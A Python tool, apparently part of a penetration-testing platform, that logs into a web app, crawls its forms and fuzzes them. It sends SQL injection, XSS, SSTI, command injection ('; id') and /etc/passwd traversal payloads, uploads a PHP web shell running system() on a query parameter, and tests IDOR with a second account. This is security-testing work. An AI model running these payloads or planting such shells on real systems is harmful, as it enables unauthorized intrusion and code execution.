#!/usr/bin/env python3
"""
Legacy App Crawler + Fuzzer for Vikramaditya VAPT Platform
Browser-based crawling and form fuzzing for PHP/CGI/JSP legacy apps.

Usage:
    python3 legacy_crawler.py --url https://target.com --creds user:pass
    python3 legacy_crawler.py --url https://target.com --creds admin:pass --creds-b user:pass
"""

import asyncio
import json
import re
import time
import sys
import os
import argparse
import requests
import urllib3
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Import shared payloads from har_vapt_engine
try:
    from har_vapt_engine import (
        SQLI_ERROR, SQLI_TIME_ORACLE, SQLI_TIME_MYSQL, SQLI_TIME_MSSQL,
        XSS_PAYLOADS, CMDI_PAYLOADS, LFI_PAYLOADS, UPLOAD_SHELLS,
        _has_sql_error, _is_static, _skip_params,
    )
except ImportError:
    # Inline fallbacks if running standalone
    SQLI_ERROR = ["' OR '1'='1", "' OR '1'='1'--", "admin'--", "' UNION SELECT NULL FROM DUAL--"]
    SQLI_TIME_ORACLE = "' || dbms_pipe.receive_message('a',{delay}) || '"
    SQLI_TIME_MYSQL = "' AND SLEEP({delay})-- "
    SQLI_TIME_MSSQL = "'; WAITFOR DELAY '0:0:{delay}'--"
    XSS_PAYLOADS = ['<script>alert("V1KR4M")</script>', '"><img src=x onerror=alert("V1KR4M")>', '{{7*7}}']
    CMDI_PAYLOADS = ['; id', '| id', '$(id)']
    LFI_PAYLOADS = ['../../../etc/passwd', '....//....//....//etc/passwd']
    UPLOAD_SHELLS = {
        'shell.phtml': ('<?php echo "V1KR4M_RCE"; system($_GET["c"]); ?>', 'application/x-httpd-php'),
        'shell.php.jpg': ('<?php echo "V1KR4M_RCE"; ?>', 'image/jpeg'),
    }
    _SQL_RE = [re.compile(p, re.I) for p in [
        r'ORA-\d{4,5}', r'SQL syntax.*MySQL', r'Unclosed quotation mark', r'pg_query']]
    def _has_sql_error(text):
        for rx in _SQL_RE:
            m = rx.search(text)
            if m: return m.group()
        return None
    def _is_static(path):
        return bool(re.search(r'\.(js|css|png|jpg|gif|svg|woff2?|ttf|ico|mp3|map)(\?|$)', path, re.I))
    def _skip_params():
        return {'els', 'ols', 'session_id', 'angular', 'output', 'jsversion',
                'uitype', 'build_ver', 'tsoffset', 'offset_timezone', 'tzcode',
                'timestamp', 'spendTime', 'compose_key'}


def _log_line(level, msg):
    sym = {'ok': '+', 'err': '-', 'warn': '!', 'info': '*', 'vuln': '🔴'}.get(level, '*')
    col = {'ok': '\033[32m', 'err': '\033[31m', 'warn': '\033[33m', 'info': '\033[36m',
           'vuln': '\033[31m'}.get(level, '')
    print(f"  {col}[{sym}]\033[0m {msg}", flush=True)


class LegacyCrawler:
    """Browser-based legacy app crawler + fuzzer."""

    def __init__(self, target_url: str, creds: str, creds_b: str = None,
                 login_url: str = None, reauth_interval: int = 8,
                 max_pages: int = 200, output_dir: str = None):
        self.target_url = target_url.rstrip('/')
        parsed = urlparse(self.target_url)
        self.base_url = f"{parsed.scheme}://{parsed.netloc}"
        self.target_domain = parsed.netloc

        self.username, self.password = creds.split(':', 1)
        self.creds_b = creds_b
        self.login_url = login_url
        self.reauth_interval = reauth_interval
        self.max_pages = max_pages
        self.output_dir = output_dir or '.'

        self.visited: set = set()
        self.forms: List[Dict] = []
        self.vulnerabilities: List[Dict] = []
        self.forms_fuzzed = 0
        self.payloads_tested = 0

        # requests session for fast fuzzing
        self.rsession = requests.Session()
        self.rsession.verify = False
        self.rsession.timeout = 20
        self.rsession.headers['User-Agent'] = (
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36')

    # ── Vulnerability logging ─────────────────────────────────────────────

    def _log_vuln(self, severity: str, vtype: str, url: str, detail: str,
                  evidence: str = "", param: str = "", payload: str = ""):
        v = {
            'timestamp': datetime.now().isoformat(),
            'type': vtype, 'severity': severity,
            'endpoint': url.split('?')[0], 'full_url': url[:500],
            'details': detail, 'evidence': evidence[:500],
            'parameter': param, 'payload': payload[:200],
        }
        self.vulnerabilities.append(v)
        icon = {'critical': '🔴', 'high': '🟠', 'medium': '🟡', 'low': '🔵'}.get(severity, '⚪')
        _log_line('vuln', f"{icon} [{severity.upper()}] {vtype}: {url.split('?')[0]}")
        print(f"      {detail[:120]}", flush=True)

    # ── Browser login ─────────────────────────────────────────────────────

    async def _login(self, context, user: str = None, pwd: str = None) -> Tuple[object, dict]:
        """Login via Playwright, return (page, session_info)."""
        user = user or self.username
        pwd = pwd or self.password

        page = await context.new_page()
        await page.goto(self.target_url, wait_until='domcontentloaded')
        await page.wait_for_load_state('networkidle')

        # Try to fill and submit login form
        html = await page.content()

        # Strategy 1: fill visible username + password fields
        filled = False
        for user_sel in ['input[name="useremail"]', 'input[name="username"]', 'input[name="user"]',
                         'input[name="email"]', 'input[name="login"]', 'input[type="email"]',
                         'input[type="text"]:not([type="hidden"])']:
            try:
                el = await page.query_selector(user_sel)
                if el and await el.is_visible():
                    await el.fill(user)
                    filled = True
                    break
            except Exception:
                continue

        # Password
        try:
            pwd_el = await page.query_selector('input[type="password"]')
            if pwd_el:
                await pwd_el.fill(pwd)
        except Exception:
            pass

        # Set hidden fields via JS (for apps like Rediffmail)
        user_part = user.split('@')[0] if '@' in user else user
        domain_part = user.split('@')[1] if '@' in user else ''
        await page.evaluate(f'''() => {{
            const setVal = (n, v) => {{ const el = document.querySelector('[name="'+n+'"]'); if(el) el.value = v; }};
            setVal("login", "{user}");
            setVal("domain", "{domain_part}");
            setVal("user", "{user_part}");
            setVal("FormName", "existing");
        }}''')

        # Submit form
        submitted = False
        for method in [
            lambda: page.evaluate('() => { const f = document.querySelector("form"); if(f) f.submit(); }'),
            lambda: page.click('input[type="submit"]'),
            lambda: page.click('button[type="submit"]'),
            lambda: page.press('input[type="password"]', 'Enter'),
        ]:
            try:
                await method()
                submitted = True
                break
            except Exception:
                continue

        if submitted:
            await page.wait_for_load_state('networkidle')

        cookies = await context.cookies()
        cookie_dict = {c['name']: c['value'] for c in cookies}

        # Check login success
        session_id = cookie_dict.get('Rsc', cookie_dict.get('JSESSIONID',
                     cookie_dict.get('session_id', cookie_dict.get('cf_at', ''))))
        success = bool(session_id) or len(cookies) > 3

        if success:
            _log_line('ok', f"Logged in as {user} ({len(cookies)} cookies)")
        else:
            _log_line('warn', f"Login may have failed for {user} ({len(cookies)} cookies)")

        return page, {'cookies': cookies, 'cookie_dict': cookie_dict, 'sid': session_id}

    def _sync_cookies(self, cookies: list):
        """Copy Playwright cookies to requests session."""
        self.rsession.cookies.clear()
        for c in cookies:
            self.rsession.cookies.set(c['name'], c['value'])

    # ── Crawling ──────────────────────────────────────────────────────────

    async def _crawl(self, page) -> None:
        """BFS crawl from current page, extracting forms."""
        queue = [self.target_url]
        # Also find links from the current page
        try:
            links = await page.evaluate('''() => {
                return [...new Set(Array.from(document.querySelectorAll('a[href]'))
                    .map(a => a.href).filter(h => h.startsWith('http')))];
            }''')
            queue.extend(links)
        except Exception:
            pass

        while queue and len(self.visited) < self.max_pages:
            url = queue.pop(0)

            # Normalize and filter
            parsed = urlparse(url)
            if parsed.netloc != self.target_domain and self.target_domain not in parsed.netloc:
                continue
            norm_path = parsed.path
            if _is_static(norm_path):
                continue
            if norm_path in self.visited:
                continue
            self.visited.add(norm_path)

            try:
                resp = await page.goto(url, wait_until='domcontentloaded', timeout=15000)
                if not resp:
                    continue
                await page.wait_for_timeout(500)

                content = await page.content()

                # Check for session expiry
                if 'sessionExpire' in content or 'session is invalid' in content.lower():
                    _log_line('warn', f"Session expired at {norm_path}, re-authenticating...")
                    ctx = page.context
                    await page.close()
                    page, info = await self._login(ctx)
                    self._sync_cookies(info['cookies'])
                    continue

                # Extract links
                new_links = await page.evaluate('''() => {
                    return [...new Set(Array.from(document.querySelectorAll('a[href]'))
                        .map(a => a.href).filter(h => h.startsWith('http')))];
                }''')
                for link in new_links:
                    lp = urlparse(link).path
                    if lp not in self.visited and not _is_static(lp):
                        queue.append(link)

                # Extract forms
                forms = await page.evaluate('''() => {
                    return Array.from(document.querySelectorAll('form')).map(form => ({
                        action: form.action || window.location.href,
                        method: (form.method || 'GET').toUpperCase(),
                        enctype: form.enctype || '',
                        fields: Array.from(form.querySelectorAll('input, textarea, select')).map(el => ({
                            name: el.name || '',
                            type: el.type || el.tagName.toLowerCase(),
                            value: el.value || '',
                            tag: el.tagName.toLowerCase(),
                            visible: el.offsetParent !== null,
                            options: el.tagName === 'SELECT' ?
                                Array.from(el.options).map(o => o.value) : []
                        })).filter(f => f.name)
                    }));
                }''')

                for form in forms:
                    fuzzable = [f for f in form['fields']
                                if f['name'].lower() not in _skip_params()
                                and f['type'] not in ('hidden', 'submit', 'button', 'reset')
                                and f['name'] not in ('login', 'session_id')]
                    if fuzzable:
                        self.forms.append({
                            'page_url': url,
                            'action': form['action'],
                            'method': form['method'],
                            'enctype': form['enctype'],
                            'fuzzable': fuzzable,
                            'all_fields': form['fields'],
                        })

            except Exception:
                continue

        _log_line('ok', f"Crawled {len(self.visited)} pages, found {len(self.forms)} forms")
        return page  # return the page (may have changed due to reauth)

    # ── Fuzzing ───────────────────────────────────────────────────────────

    def _build_form_data(self, form: dict, target_field: str, payload: str) -> dict:
        """Build form data with payload injected into target field."""
        data = {}
        for f in form['all_fields']:
            if f['name'] == target_field:
                data[f['name']] = payload
            elif f['name']:
                data[f['name']] = f['value'] or 'test'
        return data

    def _fuzz_forms(self) -> None:
        """Fuzz all discovered forms with injection payloads."""
        _log_line('info', f"Fuzzing {len(self.forms)} forms...")
        skip = _skip_params()

        for form in self.forms:
            action = form['action']
            method = form['method']
            page_name = urlparse(action).path.split('/')[-1] or 'form'

            for field in form['fuzzable']:
                fname = field['name']
                if fname.lower() in skip:
                    continue

                # SQLi error-based
                for payload in SQLI_ERROR[:4]:
                    self.payloads_tested += 1
                    data = self._build_form_data(form, fname, payload)
                    try:
                        if method == 'POST':
                            r = self.rsession.post(action, data=data, timeout=15)
                        else:
                            r = self.rsession.get(action, params=data, timeout=15)
                        match = _has_sql_error(r.text)
                        if match:
                            self._log_vuln('critical', 'SQL Injection (Error)', action,
                                           f"DB error '{match}' in param '{fname}'",
                                           evidence=r.text[:300], param=fname, payload=payload)
                            break
                    except Exception:
                        pass

                # SQLi time-based
                for tpl in [SQLI_TIME_ORACLE, SQLI_TIME_MYSQL]:
                    self.payloads_tested += 1
                    delay = 5
                    payload = tpl.format(delay=delay)
                    data = self._build_form_data(form, fname, payload)
                    try:
                        t0 = time.time()
                        if method == 'POST':
                            self.rsession.post(action, data=data, timeout=delay + 10)
                        else:
                            self.rsession.get(action, params=data, timeout=delay + 10)
                        elapsed = time.time() - t0
                        if elapsed >= delay - 0.5:
                            # Confirm
                            payload2 = tpl.format(delay=1)
                            data2 = self._build_form_data(form, fname, payload2)
                            t1 = time.time()
                            if method == 'POST':
                                self.rsession.post(action, data=data2, timeout=12)
                            else:
                                self.rsession.get(action, params=data2, timeout=12)
                            elapsed2 = time.time() - t1
                            if elapsed2 < delay - 0.5:
                                self._log_vuln('critical', 'SQL Injection (Time-Based)', action,
                                               f"Delay {elapsed:.1f}s/{elapsed2:.1f}s in '{fname}'",
                                               param=fname, payload=payload)
                    except Exception:
                        pass

                # XSS
                for payload in XSS_PAYLOADS[:4]:
                    self.payloads_tested += 1
                    data = self._build_form_data(form, fname, payload)
                    try:
                        if method == 'POST':
                            r = self.rsession.post(action, data=data, timeout=15)
                        else:
                            r = self.rsession.get(action, params=data, timeout=15)
                        if payload in r.text:
                            ctx = r.text[max(0, r.text.find(payload)-40):r.text.find(payload)+len(payload)+40]
                            if 'value="' not in ctx and "value='" not in ctx:
                                self._log_vuln('high', 'Reflected XSS', action,
                                               f"Payload reflected in '{fname}'",
                                               evidence=ctx[:200], param=fname, payload=payload)
                                break
                        if payload == '{{7*7}}' and '49' in r.text:
                            self._log_vuln('critical', 'SSTI', action,
                                           f"Template expression evaluated in '{fname}'",
                                           param=fname, payload=payload)
                            break
                    except Exception:
                        pass

                # Command injection
                for payload in CMDI_PAYLOADS[:2]:
                    self.payloads_tested += 1
                    data = self._build_form_data(form, fname, payload)
                    try:
                        if method == 'POST':
                            r = self.rsession.post(action, data=data, timeout=15)
                        else:
                            r = self.rsession.get(action, params=data, timeout=15)
                        if re.search(r'uid=\d+\(', r.text):
                            self._log_vuln('critical', 'Command Injection', action,
                                           f"OS command output in '{fname}'",
                                           evidence=r.text[:300], param=fname, payload=payload)
                            break
                    except Exception:
                        pass

                # LFI
                for payload in LFI_PAYLOADS[:2]:
                    self.payloads_tested += 1
                    data = self._build_form_data(form, fname, payload)
                    try:
                        if method == 'POST':
                            r = self.rsession.post(action, data=data, timeout=15)
                        else:
                            r = self.rsession.get(action, params=data, timeout=15)
                        if re.search(r'root:.*:0:0:|bin/bash', r.text):
                            self._log_vuln('critical', 'Local File Inclusion', action,
                                           f"/etc/passwd content in '{fname}'",
                                           evidence=r.text[:300], param=fname, payload=payload)
                            break
                    except Exception:
                        pass

            self.forms_fuzzed += 1

            # Re-authenticate periodically
            if self.forms_fuzzed % self.reauth_interval == 0:
                _log_line('info', f"Re-authenticating ({self.forms_fuzzed}/{len(self.forms)} forms)...")
                try:
                    self._quick_reauth()
                except Exception:
                    pass

    def _quick_reauth(self):
        """Re-authenticate via requests (faster than playwright)."""
        login_url = self.login_url or self.target_url
        try:
            # Fetch login page
            page_r = self.rsession.get(login_url, timeout=10)
            # Find form action
            action_m = re.search(r'<form[^>]*action=["\']([^"\']+)["\']', page_r.text, re.I)
            action = action_m.group(1) if action_m else login_url
            if action.startswith('/'):
                action = f"{self.base_url}{action}"

            user_part = self.username.split('@')[0] if '@' in self.username else self.username
            domain_part = self.username.split('@')[1] if '@' in self.username else ''
            data = {
                'FormName': 'existing', 'login': self.username,
                'domain': domain_part, 'user': user_part,
                'passwd': self.password, 'min': '1',
            }
            r = self.rsession.post(action, data=data, timeout=15, allow_redirects=False)
            new_cookies = {c.name: c.value for c in r.cookies}
            if new_cookies:
                for k, v in new_cookies.items():
                    self.rsession.cookies.set(k, v)
        except Exception:
            pass

    # ── File upload testing ───────────────────────────────────────────────

    def _test_file_uploads(self) -> None:
        """Test file upload forms for RCE."""
        upload_forms = [f for f in self.forms
                        if 'multipart' in f.get('enctype', '')
                        or any(fld['type'] == 'file' for fld in f.get('all_fields', []))]
        if not upload_forms:
            _log_line('info', "No file upload forms found")
            return

        _log_line('info', f"Testing {len(upload_forms)} file upload forms...")

        for form in upload_forms:
            action = form['action']
            file_fields = [f['name'] for f in form['all_fields'] if f['type'] == 'file']
            if not file_fields:
                file_fields = ['file']

            # Build base form data (hidden fields)
            base_data = {}
            for f in form['all_fields']:
                if f['type'] != 'file' and f['name']:
                    base_data[f['name']] = f['value'] or ''

            for fname, (content, mime) in UPLOAD_SHELLS.items():
                for file_param in file_fields:
                    try:
                        r = self.rsession.post(action,
                                               files={file_param: (fname, content, mime)},
                                               data=base_data, timeout=20)
                        if r.status_code == 200 and 'success' in r.text.lower():
                            # Try to access uploaded file
                            confirmed = False
                            for check_path in [f'/upload/{fname}', f'/uploads/{fname}',
                                               f'/files/{fname}', f'/tmp/{fname}']:
                                try:
                                    cr = self.rsession.get(f"{self.base_url}{check_path}", timeout=10)
                                    if 'V1KR4M_RCE' in cr.text:
                                        self._log_vuln('critical', 'File Upload RCE (Confirmed)', action,
                                                       f"Shell '{fname}' executing at {check_path}",
                                                       param=file_param)
                                        confirmed = True
                                        break
                                except Exception:
                                    pass
                            if not confirmed:
                                self._log_vuln('medium', 'File Upload (Accepted, Unverified)', action,
                                               f"Server accepted '{fname}' via '{file_param}'",
                                               param=file_param)
                    except Exception:
                        pass

    # ── IDOR testing ──────────────────────────────────────────────────────

    async def _test_idor(self, context_a, context_b) -> None:
        """Test IDOR using two authenticated sessions."""
        if not self.creds_b:
            _log_line('info', "No second account — skipping IDOR testing")
            return

        _log_line('info', "Testing IDOR with second account...")
        user_b, pwd_b = self.creds_b.split(':', 1)

        # Login user B
        _, info_b = await self._login(context_b, user_b, pwd_b)
        session_b = requests.Session()
        session_b.verify = False
        session_b.timeout = 20
        session_b.headers['User-Agent'] = self.rsession.headers['User-Agent']
        for c in info_b['cookies']:
            session_b.cookies.set(c['name'], c['value'])

        # For each form with user-specific data, replay with user B's session
        for form in self.forms:
            action = form['action']
            # Only test POST forms (more likely to return user data)
            if form['method'] != 'POST':
                continue

            base_data = {}
            for f in form['all_fields']:
                if f['name']:
                    base_data[f['name']] = f['value'] or ''

            try:
                # User A's response (baseline)
                r_a = self.rsession.post(action, data=base_data, timeout=15)
                # User B's response (same request)
                r_b = session_b.post(action, data=base_data, timeout=15)

                # If B gets A's data, it's IDOR
                if ('"Success"' in r_a.text and '"Success"' in r_b.text
                        and abs(len(r_a.text) - len(r_b.text)) < 50
                        and len(r_a.text) > 200):
                    # Same data returned to both users
                    self._log_vuln('high', 'IDOR', action,
                                   f"User B gets same data as User A ({len(r_a.text)}b)",
                                   evidence=r_b.text[:200])
            except Exception:
                pass

    # ── Main scan orchestrator ────────────────────────────────────────────

    def run_comprehensive_scan(self) -> dict:
        """Run the full crawl + fuzz pipeline. Returns results dict."""
        return asyncio.run(self._async_scan())

    async def _async_scan(self) -> dict:
        from playwright.async_api import async_playwright

        t0 = time.time()
        _log_line('info', f"Legacy Crawler starting: {self.target_url}")
        _log_line('info', f"Max pages: {self.max_pages} | Reauth every: {self.reauth_interval} forms")

        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            context_a = await browser.new_context(ignore_https_errors=True)

            # Phase 1: Login
            print("\n🔐 Phase 1: Login")
            page, info = await self._login(context_a)
            self._sync_cookies(info['cookies'])

            # Handle post-login interstitials (privacy policy, etc.)
            content = await page.content()
            for accept_sel in ['#btn_accept', 'button:has-text("Accept")',
                               'button:has-text("I Accept")', 'a:has-text("Skip")']:
                try:
                    btn = await page.query_selector(accept_sel)
                    if btn and await btn.is_visible():
                        await btn.click()
                        await page.wait_for_load_state('networkidle')
                        _log_line('ok', f"Dismissed interstitial ({accept_sel})")
                        self._sync_cookies(await context_a.cookies())
                        break
                except Exception:
                    continue

            # Phase 2: Crawl
            print("\n🕷️  Phase 2: Crawl")
            page = await self._crawl(page)

            # Phase 3: Fuzz
            print(f"\n🧪 Phase 3: Fuzz ({len(self.forms)} forms)")
            self._fuzz_forms()

            # Phase 4: File uploads
            print("\n📁 Phase 4: File Upload Testing")
            self._test_file_uploads()

            # Phase 5: IDOR
            if self.creds_b:
                print("\n🔀 Phase 5: IDOR Testing")
                context_b = await browser.new_context(ignore_https_errors=True)
                await self._test_idor(context_a, context_b)
                await context_b.close()

            await context_a.close()
            await browser.close()

        duration = time.time() - t0

        results = {
            'scan_info': {
                'target': self.target_domain,
                'start_time': datetime.fromtimestamp(t0).isoformat(),
                'end_time': datetime.now().isoformat(),
                'duration_seconds': round(duration, 1),
                'pages_crawled': len(self.visited),
                'forms_discovered': len(self.forms),
                'payloads_tested': self.payloads_tested,
                'engine': 'legacy_crawler',
            },
            'vulnerability_summary': {
                'total_vulnerabilities': len(self.vulnerabilities),
                'critical': sum(1 for v in self.vulnerabilities if v['severity'] == 'critical'),
                'high': sum(1 for v in self.vulnerabilities if v['severity'] == 'high'),
                'medium': sum(1 for v in self.vulnerabilities if v['severity'] == 'medium'),
                'low': sum(1 for v in self.vulnerabilities if v['severity'] == 'low'),
            },
            'crawl_summary': {
                'pages': len(self.visited),
                'forms': len(self.forms),
                'file_upload_forms': sum(1 for f in self.forms if 'multipart' in f.get('enctype', '')),
                'idor_tested': bool(self.creds_b),
            },
            'vulnerabilities': self.vulnerabilities,
            'recommendations': self._recommendations(),
        }

        # Print summary
        vs = results['vulnerability_summary']
        print(f"\n{'═' * 56}")
        print(f"  LEGACY CRAWLER COMPLETE")
        print(f"{'═' * 56}")
        print(f"  Pages crawled : {len(self.visited)}")
        print(f"  Forms fuzzed  : {self.forms_fuzzed}")
        print(f"  Payloads sent : {self.payloads_tested}")
        print(f"  Duration      : {duration:.0f}s")
        print(f"  Findings      : {vs['total_vulnerabilities']}")
        print(f"    Critical: {vs['critical']} | High: {vs['high']} | Medium: {vs['medium']} | Low: {vs['low']}")
        print(f"{'═' * 56}")

        return results

    def _recommendations(self) -> List[str]:
        types = {v['type'] for v in self.vulnerabilities}
        recs = []
        if any('SQL' in t for t in types):
            recs.append('Use parameterized queries for all database access')
        if any('XSS' in t or 'SSTI' in t for t in types):
            recs.append('Implement output encoding and Content-Security-Policy')
        if any('Command' in t for t in types):
            recs.append('Never pass user input to shell commands')
        if any('File Upload' in t for t in types):
            recs.append('Validate file type by content, disable script execution in upload dirs')
        if any('IDOR' in t for t in types):
            recs.append('Implement server-side authorization checks for all data access')
        if any('LFI' in t or 'File Inclusion' in t for t in types):
            recs.append('Validate and sanitize file paths, use allowlists for file access')
        return recs


def main():
    parser = argparse.ArgumentParser(description='Legacy App Crawler + Fuzzer')
    parser.add_argument('--url', required=True, help='Target URL')
    parser.add_argument('--creds', required=True, help='Credentials (user:pass)')
    parser.add_argument('--creds-b', help='Second account for IDOR (user:pass)')
    parser.add_argument('--login-url', help='Override login page URL')
    parser.add_argument('--max-pages', type=int, default=200, help='Max pages to crawl')
    parser.add_argument('--reauth', type=int, default=8, help='Re-auth every N forms')
    parser.add_argument('--output', default='.', help='Output directory')
    args = parser.parse_args()

    crawler = LegacyCrawler(
        target_url=args.url,
        creds=args.creds,
        creds_b=args.creds_b,
        login_url=args.login_url,
        max_pages=args.max_pages,
        reauth_interval=args.reauth,
        output_dir=args.output,
    )
    results = crawler.run_comprehensive_scan()

    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    domain = urlparse(args.url).netloc.replace(':', '_')
    out_file = os.path.join(args.output, f'legacy_vapt_{domain}_{ts}.json')
    with open(out_file, 'w') as f:
        json.dump(results, f, indent=2, default=str)
    print(f"\n💾 Results: {out_file}")


if __name__ == '__main__':
    main()
